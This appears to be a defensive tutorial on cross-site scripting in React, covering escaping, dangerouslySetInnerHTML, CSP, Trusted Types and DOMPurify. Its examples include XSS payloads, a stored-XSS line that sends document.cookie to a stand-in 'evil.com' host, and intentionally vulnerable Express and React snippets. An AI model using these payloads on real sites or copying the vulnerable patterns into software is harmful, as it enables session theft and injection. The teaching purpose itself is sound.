XSS Prevention

Cross-Site Scripting types, React's built-in protections, dangerouslySetInnerHTML risks, href="javascript:" attacks, Content Security Policy, Trusted Types, and sanitization strategies.

1. XSS Attack Types

XSS Attack Taxonomy:

┌─────────────────────────────────────────────────────────┐
│                  Cross-Site Scripting                     │
├──────────────┬──────────────────┬───────────────────────┤
│  Reflected   │     Stored       │     DOM-based          │
│  (Type 1)    │     (Type 2)     │     (Type 0)           │
├──────────────┼──────────────────┼───────────────────────┤
│ Payload in   │ Payload stored   │ Payload never reaches  │
│ URL/request  │ in database      │ server — executed      │
│ reflected in │ served to all    │ entirely in client JS   │
│ response     │ users            │                        │
├──────────────┼──────────────────┼───────────────────────┤
│ Server       │ Server           │ Client                 │
│ reflects     │ stores &         │ processes              │
│ input        │ serves input     │ input unsafely         │
└──────────────┴──────────────────┴───────────────────────┘

1.1 Reflected XSS

// Reflected XSS: payload in URL, reflected in response
// Attacker crafts URL: https://example.com/search?q=<script>alert(1)</script>

// Vulnerable server-side code (Express):
app.get('/search', (req, res) => {
  res.send(`<h1>Results for: ${req.query.q}</h1>`);
  // Directly embeds user input in HTML — XSS!
});

// In React SSR context:
function SearchResults({ query }) {
  // React escapes this automatically — SAFE
  return <h1>Results for: {query}</h1>;
  // Output: <h1>Results for: &lt;script&gt;alert(1)&lt;/script&gt;</h1>
}

1.2 Stored XSS

// Stored XSS: payload saved in database, served to all users
// Attacker posts comment: <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">

// If the application renders this comment without sanitization,
// every user who views the page executes the attacker's script

// React protects against this in JSX:
function Comment({ text }) {
  return <p>{text}</p>;  // SAFE — React escapes HTML entities
}

// But NOT if you use dangerouslySetInnerHTML:
function Comment({ html }) {
  return <p dangerouslySetInnerHTML={{ __html: html }} />;  // DANGEROUS!
}

1.3 DOM-based XSS

// DOM-based XSS: payload processed entirely in client JavaScript
// URL: https://example.com/#<img src=x onerror=alert(1)>

// Vulnerable code:
document.getElementById('output').innerHTML = location.hash.slice(1);

// React equivalent vulnerability:
function HashDisplay() {
  const hash = window.location.hash.slice(1);
  // DANGEROUS — injects unsanitized HTML
  return <div dangerouslySetInnerHTML={{ __html: hash }} />;
}

// Common DOM XSS sinks in React apps:
// - dangerouslySetInnerHTML
// - document.write()
// - element.innerHTML
// - eval()
// - setTimeout/setInterval with string arguments
// - new Function()

2. React's Built-in XSS Protection

2.1 JSX Auto-Escaping

// React automatically escapes values embedded in JSX
const userInput = '<script>alert("xss")</script>';

// This is SAFE — React escapes the string
const element = <div>{userInput}</div>;
// Rendered HTML: <div>&lt;script&gt;alert("xss")&lt;/script&gt;</div>

// Escaping happens in the ReactDOM renderer:
// It converts: < → &lt;  > → &gt;  & → &amp;  " → &quot;  ' → &#x27;

// This applies to:
// - Text content: <p>{userInput}</p>
// - Attribute values: <div title={userInput}>
// - But NOT to:
//   - dangerouslySetInnerHTML
//   - href/src attributes (partially)
//   - Event handlers (they're functions, not strings)

2.2 $$typeof Symbol Protection

// React elements have a $$typeof property set to a Symbol
// This prevents JSON injection attacks

const element = <div>Hello</div>;
// Internal representation:
{
  $$typeof: Symbol.for('react.element'), // Cannot be in JSON
  type: 'div',
  props: { children: 'Hello' },
  key: null,
  ref: null,
}

// Attack scenario without $$typeof:
// Server returns user-controlled JSON that looks like a React element:
const malicious = {
  type: 'div',
  props: {
    dangerouslySetInnerHTML: {
      __html: '<script>alert("xss")</script>'
    }
  }
};

// Without $$typeof, React would render this as a real element
// With $$typeof (a Symbol), JSON.parse cannot produce it:
JSON.stringify(Symbol.for('react.element')); // undefined
// So server-returned JSON can never contain a valid $$typeof

Architect Insight: $$typeof Defense

The $$typeof Symbol is a defense against a specific attack vector: when server-side code passes user-controlled JSON directly to React rendering. Since JSON.parse cannot produce Symbols, an attacker cannot craft a JSON payload that React will treat as a valid element. This was added in React 0.14 after the discovery that some applications passed unsanitized server data directly into JSX. It's a defense-in-depth measure — you should still validate server data.

3. dangerouslySetInnerHTML Risks

// dangerouslySetInnerHTML bypasses React's escaping
// It's named "dangerously" for a reason

// UNSAFE: rendering user-provided HTML
function UserContent({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// SAFE: sanitize first with DOMPurify
import DOMPurify from 'dompurify';

function UserContent({ html }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOW_DATA_ATTR: false,
  });
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// Even better: use a Markdown renderer instead of raw HTML
import ReactMarkdown from 'react-markdown';

function UserContent({ markdown }) {
  return (
    <ReactMarkdown
      allowedElements={['p', 'strong', 'em', 'a', 'ul', 'ol', 'li']}
      unwrapDisallowed
    >
      {markdown}
    </ReactMarkdown>
  );
}

4. href="javascript:" Attacks

// React does NOT fully protect against javascript: URLs
const userUrl = 'javascript:alert(document.cookie)';

// This is DANGEROUS — React renders the href as-is
<a href={userUrl}>Click me</a>;
// React 16.9+ logs a warning but still renders it

// Defense: validate URLs before rendering
function SafeLink({ href, children }) {
  const isValid = /^https?:\/\//i.test(href) || href.startsWith('/');

  if (!isValid) {
    console.warn(`Blocked potentially dangerous URL: ${href}`);
    return <span>{children}</span>;
  }

  return (
    <a href={href} rel="noopener noreferrer">
      {children}
    </a>
  );
}

// URL validation utility
function sanitizeUrl(url) {
  const parsed = new URL(url, window.location.origin);
  const allowedProtocols = ['http:', 'https:', 'mailto:', 'tel:'];

  if (!allowedProtocols.includes(parsed.protocol)) {
    return '#'; // Safe fallback
  }
  return parsed.href;
}

5. SVG Injection

// SVGs can contain executable JavaScript
// <svg><script>alert('XSS')</script></svg>
// <svg onload="alert('XSS')"></svg>
// <svg><a xlink:href="javascript:alert('XSS')"><text>Click</text></a></svg>

// Dangerous: rendering user-uploaded SVGs as HTML
function Avatar({ svgContent }) {
  // NEVER do this with user-provided SVGs
  return <div dangerouslySetInnerHTML={{ __html: svgContent }} />;
}

// Safe approaches:
// 1. Render SVGs as <img> (no script execution)
function Avatar({ svgUrl }) {
  return <img src={svgUrl} alt="avatar" />;
}

// 2. Sanitize SVGs with DOMPurify
import DOMPurify from 'dompurify';

function SafeSvg({ svgContent }) {
  const clean = DOMPurify.sanitize(svgContent, {
    USE_PROFILES: { svg: true },
    ADD_TAGS: ['use'],
    FORBID_TAGS: ['script'],
    FORBID_ATTR: ['onload', 'onerror', 'onclick'],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

6. Content Security Policy (CSP)

CSP is a browser security mechanism that restricts which resources can be loaded and executed on a page.

// CSP via HTTP header (preferred)
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://cdn.example.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';

// CSP via meta tag (limited — no frame-ancestors, report-uri)
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' 'nonce-abc123'">

// Nonce-based CSP for inline scripts (Next.js example)
// next.config.js
const cspHeader = `
  default-src 'self';
  script-src 'self' 'nonce-${nonce}';
  style-src 'self' 'unsafe-inline';
`;

// In middleware.ts
import { NextResponse } from 'next/server';

export function middleware(request) {
  const nonce = crypto.randomUUID();
  const response = NextResponse.next();
  response.headers.set('Content-Security-Policy',
    `script-src 'self' 'nonce-${nonce}'`);
  return response;
}

CSP Directives Reference

DirectiveControlsRecommended Value
default-srcFallback for all resource types'self'
script-srcJavaScript sources'self' 'nonce-{random}'
style-srcCSS sources'self' (avoid 'unsafe-inline')
img-srcImage sources'self' data: https:
connect-srcfetch/XHR/WebSocket targets'self' https://api.example.com
frame-ancestorsWho can embed this page'none' (prevents clickjacking)
base-uriAllowed <base> URLs'self'
form-actionForm submission targets'self'
object-srcPlugin content (Flash, etc.)'none'

CSP and React Challenges

'unsafe-inline' for scripts defeats much of CSP's protection. React itself doesn't require inline scripts, but some patterns do: (1) styled-components injects inline <style> tags (needs style-src 'unsafe-inline' or nonces), (2) Next.js injects inline scripts for hydration data (supports nonce-based CSP), (3) Webpack's style-loader injects inline styles. Use nonce-based CSP where possible, and prefer CSS solutions that don't require inline styles (CSS Modules, Tailwind, external stylesheets).

7. Trusted Types API

// Trusted Types prevent DOM XSS by requiring typed values
// for dangerous DOM sinks (innerHTML, eval, etc.)

// Enable via CSP header:
// Content-Security-Policy: require-trusted-types-for 'script';
//   trusted-types myPolicy;

// Create a policy
const policy = trustedTypes.createPolicy('myPolicy', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScriptURL: (input) => {
    const url = new URL(input, location.origin);
    if (url.origin !== location.origin) {
      throw new Error('Blocked external script URL');
    }
    return url.href;
  },
  createScript: (input) => {
    throw new Error('Script creation is not allowed');
  },
});

// Usage — DOM sinks now require TrustedHTML
element.innerHTML = policy.createHTML(userInput);  // OK
element.innerHTML = userInput;  // TypeError! String not allowed

// React integration challenge:
// React's own DOM manipulation uses innerHTML internally
// Need a default policy or React-specific policy

8. XSS in SSR Contexts

// Server-side rendering introduces additional XSS vectors

// 1. Serialized state injection
// Server renders initial state into HTML for hydration:
const html = `
  <script>
    window.__INITIAL_STATE__ = ${JSON.stringify(serverState)};
  </script>
`;
// If serverState contains </script>, it breaks out of the script tag!
// Attack: serverState = { name: "</script><script>alert(1)</script>" }

// Defense: escape HTML entities in JSON
function serializeState(state) {
  return JSON.stringify(state)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    .replace(/'/g, '\\u0027');
}

// Next.js handles this automatically in getServerSideProps

// 2. Meta tag injection
// If user input ends up in meta tags:
<meta property="og:title" content="${userInput}">
// Attack: userInput = '" ><script>alert(1)</script><meta "'
// Defense: HTML-encode attribute values

// 3. SSR + dangerouslySetInnerHTML
// Same risks as client-side, but the HTML is in the initial response
// Sanitize on the server before rendering

9. DOMPurify Configuration

import DOMPurify from 'dompurify';

// Strict configuration for user-generated content
const strictConfig = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br',
                 'ul', 'ol', 'li', 'blockquote', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'target', 'rel', 'class'],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ['target'],
  FORBID_TAGS: ['style', 'script', 'iframe', 'form', 'input'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
};

// Hook to force rel="noopener noreferrer" on links
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});

// React hook for sanitized HTML
function useSanitizedHtml(dirty) {
  return useMemo(
    () => ({ __html: DOMPurify.sanitize(dirty, strictConfig) }),
    [dirty]
  );
}

function SafeHtml({ html }) {
  const sanitized = useSanitizedHtml(html);
  return <div dangerouslySetInnerHTML={sanitized} />;
}

Architect Insight: Defense in Depth for XSS

No single defense prevents all XSS. A Staff-level approach layers defenses: (1) React's auto-escaping handles most cases, (2) Input validation rejects obviously malicious input at the API layer, (3) Output encoding via DOMPurify for any HTML rendering, (4) CSP headers as a last line of defense — even if XSS occurs, CSP limits what the attacker can do, (5) Trusted Types to prevent DOM XSS sinks, (6) httpOnly cookies to prevent cookie theft even if XSS succeeds. Each layer catches attacks that slip through the previous one.
